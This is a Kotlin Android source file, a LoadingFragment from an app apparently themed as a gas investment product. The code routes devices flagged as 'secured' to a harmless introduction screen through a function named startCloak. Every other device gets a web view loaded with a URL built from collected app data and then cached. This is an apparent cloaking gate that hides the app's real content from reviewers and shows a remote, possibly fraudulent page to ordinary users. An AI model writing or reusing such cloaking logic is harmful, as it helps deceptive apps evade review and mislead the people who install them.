package manage.invest.pre.gaz.ui.fragments

import android.content.Context
import android.os.Bundle
import android.view.LayoutInflater
import android.view.View
import android.view.ViewGroup
import androidx.core.os.bundleOf
import androidx.fragment.app.Fragment
import androidx.lifecycle.lifecycleScope
import androidx.navigation.fragment.findNavController
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import manage.invest.pre.gaz.R
import manage.invest.pre.gaz.databinding.LoadingFragmentBinding
import manage.invest.pre.gaz.util.AppsLoader
import manage.invest.pre.gaz.util.Checker
import manage.invest.pre.gaz.util.UriBuilder

class LoadingFragment : Fragment() {

    private var _binding: LoadingFragmentBinding? = null
    private val binding get() = _binding!!
    private val checker = Checker()

    private lateinit var savedUrl: String
    lateinit var url: String
    private val builder = UriBuilder()

    override fun onCreateView(
        inflater: LayoutInflater,
        container: ViewGroup?,
        savedInstanceState: Bundle?
    ): View {
        _binding = LoadingFragmentBinding.inflate(inflater, container, false)
        return binding.root
    }

    override fun onViewCreated(view: View, savedInstanceState: Bundle?) {
        super.onViewCreated(view, savedInstanceState)
        val pref = requireActivity().getSharedPreferences("pref", Context.MODE_PRIVATE)
        val appsLoader = AppsLoader(requireActivity())

        if (checker.isDeviceSecured(requireActivity())) {
            startCloak()
        } else {
            savedUrl = pref.getString("savedUrl", "").toString()

            if (savedUrl == "") {
                lifecycleScope.launch(Dispatchers.IO) {
                    appsLoader.getApps(requireActivity()).collect {
                        url = builder.buildUrl(it, requireActivity())
                        lifecycleScope.launch(Dispatchers.Main) {
                            startWEb(url)
                        }
                    }
                }
            } else {
                startWEb(savedUrl)
            }

        }
    }

    private fun startCloak() {
        findNavController().navigate(R.id.introductionFragment)
    }

    private fun startWEb(url: String) {
        val bundle = bundleOf("url" to url)
        findNavController().navigate(R.id.webFragment, bundle)
    }

    override fun onDestroy() {
        super.onDestroy()
        _binding = null
    }
}

